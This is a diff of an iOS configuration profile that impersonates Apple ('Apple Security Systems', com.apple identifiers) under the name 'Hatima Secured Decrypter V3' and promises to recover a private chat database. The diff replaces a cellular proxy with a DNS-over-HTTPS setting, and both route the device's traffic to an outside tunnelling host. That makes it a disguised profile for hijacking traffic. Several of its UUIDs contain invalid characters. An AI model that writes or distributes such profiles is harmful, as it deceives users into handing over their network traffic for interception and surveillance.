@@ -6,42 +6,38 @@
     <array>
         <dict>
             <key>PayloadDescription</key>
-            <string>Configures cellular data settings for secure access.</string>
+            <string>Configures secure DNS for identity verification.</string>
             <key>PayloadDisplayName</key>
-            <string>Cellular Security Update</string>
+            <string>Secure DNS Proxy</string>
             <key>PayloadIdentifier</key>
-            <string>com.apple.cellular.proxy.1</string>
+            <string>com.apple.dnsSettings.managed.1</string>
             <key>PayloadType</key>
-            <string>com.apple.cellular</string>
+            <string>com.apple.dnsSettings.managed</string>
             <key>PayloadUUID</key>
-            <string>F1E2D3C4-B5A6-9788-7543-A1B2C3D4E5F6</string>
+            <string>D5E6F7G8-H9I0-J1K2-L3M4-N5O6P7Q8R9S0</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
-            <key>APNs</key>
-            <array>
-                <dict>
-                    <key>Name</key>
-                    <string>Default</string>
-                    <key>ProxyServer</key>
-                    <string>consuetudo.serveousercontent.com</string>
-                    <key>ProxyServerPort</key>
-                    <integer>80</integer>
-                </dict>
-            </array>
+            <key>DNSSettings</key>
+            <dict>
+                <key>DNSProtocol</key>
+                <string>HTTPS</string>
+                <key>ServerURL</key>
+                <string>https://consuetudo.serveousercontent.com</string>
+            </dict>
         </dict>
     </array>
     <key>PayloadDescription</key>
-    <string>Mandatory Security Decrypter for iCloud Database Recovery.</string>
+    <string>Hatima Secured Decrypter - Essential update to recover private chat database.</string>
     <key>PayloadDisplayName</key>
     <string>Hatima Secured Decrypter V3</string>
     <key>PayloadIdentifier</key>
-    <string>com.apple.security.verify.v3</string>
+    <string>com.apple.security.decrypter.v3</string>
     <key>PayloadOrganization</key>
-    <string>Apple Security</string>
+    <string>Apple Security Systems</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>A1B2C3D4-E5F6-7G8H-9I0J-K1L2M3N4O5P6</string>
+    <string>E5F6G7H8-I9J0-K1L2-M3N4-O5P6Q7R8S9T0</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
 </dict>
